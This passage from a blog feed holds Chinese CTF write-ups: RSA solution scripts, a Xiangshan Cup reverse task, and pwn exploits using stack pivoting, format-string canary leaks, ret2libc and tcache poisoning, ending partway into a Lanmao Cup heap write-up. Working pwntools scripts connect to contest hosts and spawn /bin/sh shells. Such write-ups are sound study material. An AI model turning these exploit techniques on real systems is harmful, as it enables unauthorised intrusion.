og[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(get_shell))</span><br><span class="line">content = p64(get_shell)</span><br><span class="line">io.sendline()</span><br><span class="line">edit(<span class="number">2</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了写这题我还特意写了个 exp_local.py 来测试本地高版本libc的堆..</p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<blockquote>
<p>没想到 ak 的居然是密码，这俩都是板子题</p>
</blockquote>
<h2 id="ezrsa">ezRSA</h2>
<p>这题两个数的位置反了😭卡了好长时间来着，我说为什么 getPrime 生成的 p
怎么会不是素数</p>
<p>这题一眼求解二次剩余，公钥课上学过(没想到课堂上的东西能拿来打CTF)，从网上扒一个脚本直接解
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">13107939563507459774616204141253747489232063336204173944123263284507604328885680072478669016969428366667381358004059204207134817952620014738665450753147857</span></span><br><span class="line">a=<span class="number">4124820799737107236308837008524397355107786950414769996181324333556950154206980059406402767327725312238673053581148641438494212320157665395208337575556385</span></span><br><span class="line"></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">P=(p-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> p%<span class="number">4</span>==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line">    <span class="built_in">print</span>(-gmpy2.powmod(a,<span class="built_in">int</span>((p+<span class="number">1</span>)//<span class="number">4</span>),p))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">while</span> P%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">        P=P//<span class="number">2</span></span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    q=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> q: </span><br><span class="line">        l=gmpy2.powmod(q,<span class="built_in">int</span>((p-<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">        <span class="keyword">if</span> l==p-<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        q=sympy.nextprime(q)</span><br><span class="line">    b=gmpy2.powmod(q,P,p)</span><br><span class="line">    x=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line">    re_a=gmpy2.invert(a,p)</span><br><span class="line">    x[k-<span class="number">1</span>]=gmpy2.powmod(a,<span class="built_in">int</span>((P+<span class="number">1</span>)//<span class="number">2</span>),p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,k):</span><br><span class="line">        m=re_a*<span class="built_in">pow</span>(x[k-i],<span class="number">2</span>)</span><br><span class="line">        n=<span class="built_in">pow</span>(<span class="number">2</span>,(k-i-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> gmpy2.powmod(m,n,p)==p-<span class="number">1</span>:</span><br><span class="line">            j0=<span class="number">1</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]*<span class="built_in">pow</span>(b,j0*(<span class="number">2</span>**(i-<span class="number">1</span>)))%p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j1=<span class="number">0</span></span><br><span class="line">            x[k-i-<span class="number">1</span>]=x[k-i]%p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(p-x[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0sMV.png" /> ## hdRSA</p>
<p>3:00-5:00就在找这道题的关键词...</p>
<p>从 "rsa 特殊构造p" 到 "rsa D*V**2+1" 再到 "rsa
4p+1"，终于让我找到有用的东西了，从<a
href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">Lazzzaro的这篇博客</a>里，找到了<a
href="https://github.com/crocs-muni/cm_factorization/tree/master">这个工具</a>,直接
tmux 四个窗口梭哈遍历 D！</p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0KdW.png" /></p>
<p>分解出 pq 来以后就是常规 rsa 了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">187275367513186345104534865239994699892170904489725413330767115192172530253625393062151741036312498277557971553595091826062438445856091864605758318579599363539202154625683947568962358702545878760994434813222953503460910447662183200334960821110618746899798165363389255347363192576250804362413854445821046755759458439443253294822553986237695607000569717855942461517564526611106601774100617668231506539201297550376834067118784548951699927659889815770492684106287801610261026674778509245649501695344652216367741171392139049785280654043804502329999760613658697298671602787929199239524617160567336634126185042907593427921016129734757065504417112269027028799047579450965076835882020261162192475637278445255805339324893626400179818784574957669576516363342104273184813708475202313539634027764340858242764934872804570810575764191987921655276520658100755510986290562980055133376750812535713567917823663134974180449002466833109112866681229626239871954125027501071383217816313440079294139254989413050731511516498127225020975071747314764552267845933494600295296885808466296844091612401062566502515356974852161817112538289440970059783116540091633055220150093646069438113246518726017868258339512247175386052684861670431148484455765445960495130308147156436998327553854387741014177421559585683382003377803158283603889312107837885491964835073892174406797445622388505256985237867456926792546588756970045576002345376035346727906264683596628903417932566383221754976804148878057310066885140776352202510584461556988179369177560403923399529842871087532495739921906849249072433614545319458973155343802539527630971239359995893495205324483418191744545506744253222956232506980824457995662900264427265978239540089825733734306363153471606200228841997928021468359645661221933848545854596097640552489404777927679709089475954033350287287833943519423030861868256961619722983499902810335</span></span><br><span class="line">n = <span class="number">330961752887996173328854935965112588884403584531022561119743740650364958220684640754584393850796812833007843940336784599719224428969119533284286424077547165101460469847980799370419655082069179038497637761333327079374599506574723892143817226751806802676013225188467403274658211563655876500997296917421904614128056847977798146855336939306463059440416150493262973269431000762285579221126342017624118238829230679953011897314722801993750454924627074264353692060002758521401544361385231354313981836056855582929670811259113019012970540824951139489146393182532414878214182086999298397377845534568556100933934481180701997394558264969597606662342898026915506749002491326250792107348176681795942799954526068501499100232598658650184565873243525176833451664254917655703178472944744658628534195346977023418550761620254528178516972066618936960223660362493931786389085393392950207048675797593816271435700130995225483316625836104802608163745376633884840588575355936746173068655319645572100149515524131883813773486917122153248495022372690912572541775943614626733948206252900473118240712831444072243770979419529210034883903111038448366933374841531126421441232024514486168742686297481063089161977054825621099768659097509939405315056325336120929492838479309609958696957890570295444494277819063443427972643459784894450787015151715676537385237767990406742547664321563688829289809321534752244260529319454316532580416182438749849923354060125229328043961355894086576238519138868298499249023773237770103057707912709725417033309061308880583988666463892828633292839968866953776989722310954204550783825704710017434214644199415756584929214239679433211393230307782953067246529626136446314941258877439356094775337541321331600788042698664632064112896956898222397445497695982546922871549828242938368486774617350420790711093069910914135319635330786253331223459637232106417577225350441291</span></span><br><span class="line">p = <span class="number">16486456392568284654575447481741337432037045210800881835922614280067095597403710005455885867829534599108105197853120121574779191481125315722964257888873579099800690068397728960335561315717619132097747891006990987234219773215951341290375325467839650020485843410133760476863038747605417567970738312428198804291743647184526806692092507258393049800262129700391618652453916902141512582838357424455278388992820311182042750759628796263458005206211851622898042001270110860445227518098099442496544291487453616861604254291750411887857595093636553437331170435660475454672143330589299824376076547689051724844786337326281769222107417355877587836699896745726567628092282995399905968099655245359825181671342180522153867520458557378100805495885728965517124749113185924078688116625743891547407248459361185534137655598794841381345072595952173547088910141316887889085791098603541066183857855045537851225348728432140633429582547355875169018387146998010651697236311238281309072462571334886501953441278420091394620498419461947569630534013992500053942893075863031452593127978173868322268503740398804653340332478754797272662812261231775395620689300949393859423566492311584685742006804194387349833713097736389655660701086473349762351032974011890884285149086019</span> </span><br><span class="line">q = <span class="number">20074765917385746960935546244046943454462816043103272528361092579826674512173765241930755746125701611787832050933381141287876969868161022364171839735197812750520430729316788310479069323911390204105953536522038545353910488349500120367222425966798487691717708110938190921291433703777234979917798631930961003842873264252345740246004565354378673284300771278077629291983142857452945395644496169376540506242324806217396415838590757988653416655884020806407076836843763182293453375883193557418497971808909707169877529993060558008071543221829096316946680943004116896967543999782332968077171180309491946947119885153993121862489</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q*p = &#x27;</span>,q*p,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> n == p*q:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n == p * q&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n != p * q&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(n-p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n-q = &#x27;</span>,n-q,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023香山杯Pwn &amp; RE-wp</title>
    <url>/posts/7380.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
香山杯！Pwn ak + RE 差几分钟就写完xxTEA啦😭
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h3 id="url从哪儿来">url从哪儿来</h3>
<p><img src="/pic/image-1.png" /></p>
<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
<img src="/pic/image-2.png" />
ida打开，因为它问url是什么，所以我们直接看szurl <img
src="/pic/image-3.png" />
结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
<img src="/pic/image-4.png" /> flag就在这 <img
src="/pic/image-5.png" /></p>
<h1 id="pwn">Pwn</h1>
<h3 id="move">Move</h3>
<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp头 ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;59.110.125.41&#x27;</span></span><br><span class="line">port = <span class="number">45341</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line">bss_addr = <span class="number">0x4050A0</span></span><br><span class="line">lea_addr = <span class="number">0x4012E0</span></span><br><span class="line">junk = <span class="number">0x30</span></span><br><span class="line">pop_rdi = <span class="number">0x401353</span></span><br><span class="line">start_addr = <span class="number">0x401264</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line">io.sendafter(<span class="string">&#x27;number&#x27;</span>,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈劫持 ---------------------------------------------------------------</span></span><br><span class="line">payloadload = <span class="string">b&#x27;a&#x27;</span>*junk + p64(bss_addr-<span class="number">8</span>) + p64(lea_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr  = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># sh_addr = 0x402027</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;again!\n&#x27;</span>,bss_payloadload)</span><br><span class="line"><span class="comment"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span></span><br><span class="line"><span class="comment"># io.sendafter(&#x27;number&#x27;,payloadload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span></span><br><span class="line"><span class="comment"># io.send(payloadload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="pwthon">Pwthon</h3>
<p>Cpython pwn<br />
核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
gift泄露基地址和返回地址<br />
格式化字符串泄露canary<br />
通过puts泄露libc ret2libc <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">domain_name = <span class="string">&#x27;39.106.48.123&#x27;</span></span><br><span class="line">port = <span class="number">29572</span></span><br><span class="line"><span class="comment"># file = &#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"><span class="comment"># io = process(file)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;gift&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base = gift- <span class="number">0x68B0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gift&#x27;</span>,gift)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%p-&#x27;</span>*<span class="number">31</span>+<span class="string">b&#x27;q%pq&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;q&#x27;</span>,drop=<span class="string">&#x27;Ture&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000003f8f</span> + base</span><br><span class="line">pop_rsi = <span class="number">0x0000000000003cd9</span> + base</span><br><span class="line">bss = <span class="number">0x016FC0</span>+<span class="number">0x100</span>+base</span><br><span class="line">read = <span class="number">0x3940</span>+base</span><br><span class="line">write = <span class="number">0x03760</span>+base</span><br><span class="line">op = <span class="number">0x3AE0</span>+base</span><br><span class="line">flag = <span class="number">0x000000000003c257</span>+base</span><br><span class="line">puts = <span class="number">0x3710</span>+base</span><br><span class="line">ret = <span class="number">0x000000000000301a</span>+base</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">33</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi)+p64(<span class="number">0x16078</span>+base)+p64(puts)+p64(base+<span class="number">0x99f0</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;</span></span><br><span class="line">io.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;len &quot;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">32</span>+p64(canary)*<span class="number">3</span>+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>WriteUp</tag>
        <tag>Reverse</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2023第七届蓝帽杯初赛Pwn-takeway-wp</title>
    <url>/posts/62959.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
学艺不精...对于"读/写函数对指针的利用"没那么敏感（
</blockquote>
<span id="more"></span>
<h1 id="xff-说在前面">0xff 说在前面</h1>
<p>下文EXP中，leak堆地址的部分需要"伪爆破"，如果报错的话多运行两三次脚本，直到heap_addr为四字节时即可成功运行
<a href="https://cowtransfer.com/s/bf2ac55a69364d">题目地址</a>下载口令:
7c9pe6</p>
<h1 id="x00-exploitations">0x00 Exploitations</h1>
<ol type="1">
<li>tcachebin libc2.31
<ol type="1">
<li>tcachebin poisoning</li>
<li>版本判断
<ol type="1">
<li>tcache有key混淆，则是2.31以上(不包含2.31)</li>
<li>tcache有doublefree检测，则是2.28以上</li>
<li>有tcache，则是2.26及以上</li>
</ol></li>
</ol></li>
<li>UAF</li>
<li>利用题目提供的堆表+puts/read进行任意地址读写</li>
</ol>
<h1 id="x01-反汇编修改">0x01 反汇编修改</h1>
<pre><code>    首先进行一个反汇编的读   </code></pre>
<blockquote>
<p>trick: IDA中对变量按Y键可以改变变量类型</p>
</blockquote>
<p><img src="/pic/Pasted%20image%2020230826230935.png" /> alloc:
strcspn是从字符串中返回不含“所查找字符”的子字符串的长度 <img
src="/pic/Pasted%20image%2020230826231015.png" /> delete:
指针未置零，一眼UAF <img
src="/pic/Pasted%20image%2020230826231112.png" /> modify <img
src="/pic/Pasted%20image%2020230826231127.png" /></p>
<h1 id="x02-分析与思路构造">0x02 分析与思路构造</h1>
<blockquote>
<p>分析部分</p>
</blockquote>
<ol type="1">
<li>分析alloc: 只给了五次创建堆的机会，堆的大小都固定为0x28
<ol type="1">
<li>没办法直接用unsortedbin leak libc</li>
<li>不能通过填满tcachebin来绕过tcache机制</li>
<li>tcachebins poisoning
<ol type="1">
<li>能拿到堆地址: 通过gdb找偏移来在堆区伪造chunk</li>
<li>能拿到栈地址: 通过gdb找偏移来在栈区伪造chunk</li>
</ol></li>
</ol></li>
<li>分析modify: 有puts/read
<ol type="1">
<li>可能通过puts"直到遇到换行符才停止输出"的原理来泄露什么东西</li>
</ol></li>
<li>分析delete
<ol type="1">
<li>UAF</li>
</ol></li>
<li>远程测试libc版本
<ol type="1">
<li>doubleFree有限制，2.28以上</li>
<li>没有key混淆bk，可以直接拿到堆地址，2.31及以下</li>
</ol></li>
</ol>
<blockquote>
<p>思路构造部分</p>
</blockquote>
<p>最开始没patchelf，只能free两个chunk到tcachebin里，通过泄露fd的方式来泄露堆地址，然后我想tcachebin
poisoning把堆中大小为0x1011的缓冲区下面的那一部分给修改一下，改成unsortedbin然后获取libc，再poison到got表修改free，最后提权。但这样消耗的chunk数目远大于5个。</p>
<p>后来patch以后发现bk里就有堆地址，然后又想到临近top chunk的unsorted
bin会被合并。于是把目标对准了heapList。想通过修改heapList的size段位0x1041来伪造一个unsortedbin，然后leak
libc。结果也是需要大量chunk，而且还申请失败了，现在没搞明白为啥失败了不说，连报错都忘了，无从下手了（</p>
<p>打完比赛以后跟N1nEmAn师傅沟流了一下，发现题目如果能在heapList伪造chunk的话，就可以通过modify函数里的puts和read任意地址读写了。我直接震撼HeyGap一百年。</p>
<p>综上，思路为：<br />
1. 利用tcachebin的bk泄露堆地址 2.
在heapList伪造chunk，修改chunk0_ptr为"puts_got-8" 3.
puts会打印puts_got指向的地址，即puts_libc_addr，然后计算system地址 4.
通过gdb发现"puts_got-8"正好是"free_got" 5.
而read函数正好是修改"puts_got-8"指向的地址，即free_libc_addr，我们将其修改为sys_libc_addr
6. 由于chunk0_ptr,
chunk1_ptr均被修改，所以我们要找"ptr没有被修改"&amp;"chunk没有被free过"的chunk2存一下/bin/sh
7. free chunk2 --&gt; getshell！ # 0x03 分步解题 1.
patchelf，根据远程调试选择了libc2.31 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath &#x27;$ORIGIN/&#x27; file_name</span><br><span class="line">patchelf --set-interpreter my-ld-linux.so.2 my-program</span><br><span class="line">patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program</span><br></pre></td></tr></table></figure></p>
<ol start="2" type="1">
<li>利用tcachebin的bk泄露堆地址 可以看到bk是指向tcachebin_entries[3]的
<img src="/pic/Pasted%20image%2020230827001916.png" />
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = payload2 = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,payload1,payload2)</span><br><span class="line">alloc(<span class="number">1</span>,payload1,payload2)     <span class="comment"># 这里申请了chunk1其实对这一步没啥用，下一步申请也行</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choose: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">5</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) <span class="comment"># 注：这里我没想到更好的方法，heap_addr有可能是三字节</span></span><br><span class="line">															  也有可能是四字节，所以后续如果报错多试几次就行。</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name is: &#x27;</span>, payload)</span><br></pre></td></tr></table></figure></li>
<li>通过tcache poisoning在heapList段伪造chunk2， <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)                        <span class="comment"># 把上一步申请的chunk1放进tcachebin</span></span><br><span class="line"><span class="comment"># gdb.attach(io)                 # 通过bins命令可以看到现在是tcachebin_entries[3] -&gt; chunk1 -&gt; chunk0</span></span><br><span class="line">payload = p64(heap_addr + <span class="number">0x290</span>) <span class="comment"># 改为tcachebin_entries[3] -&gt; chunk1 -&gt; (heap_addr + 0x290)</span></span><br><span class="line">fill(<span class="number">1</span>,payload)                  </span><br><span class="line">alloc(<span class="number">2</span>,payload1,payload2)       <span class="comment"># 把chunk1申请出来，bins变为tcachebin_entries[3] -&gt; (heap_addr + 0x290)</span></span><br></pre></td></tr></table></figure></li>
<li>申请chunk2，同时把puts_got-8写进heapList[0]，然后通过modify函数中的puts泄露libc（笔误:
下图“加上下一个chunk的prev_size构成了chunk2”中的"chunk2"应为chunk3）
